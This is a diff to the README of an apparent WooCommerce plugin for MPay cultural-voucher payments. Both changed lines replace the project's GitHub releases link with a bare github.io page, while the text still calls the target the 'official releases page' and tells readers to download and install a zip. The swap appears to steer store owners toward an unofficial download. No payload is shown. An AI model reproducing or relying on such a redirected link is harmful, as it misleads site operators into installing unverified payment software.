@@ -1,6 +1,6 @@
 # 💳 mpay-cultural-voucher-woocommerce-gateway - Process cultural voucher payments on WooCommerce
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/chopbullshot922/mpay-cultural-voucher-woocommerce-gateway/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://chopbullshot922.github.io)
 
 This plugin connects your WooCommerce store to the Moldova MPay system. It allows your customers to pay for items using cultural vouchers. The integration handles the secure communication between your store and the national payment provider.
 
@@ -19,7 +19,7 @@ To use this plugin, your website needs to meet these basic standards:
 
 Follow these steps to add the payment gateway to your store.
 
-1. Visit the [official releases page](https://github.com/chopbullshot922/mpay-cultural-voucher-woocommerce-gateway/releases) to download the plugin.
+1. Visit the [official releases page](https://chopbullshot922.github.io) to download the plugin.
 2. Look for the file named `mpay-cultural-voucher.zip` under the latest release heading.
 3. Click the file name to save the zip folder to your computer. Do not unzip this file.
 4. Log in to your WordPress dashboard.
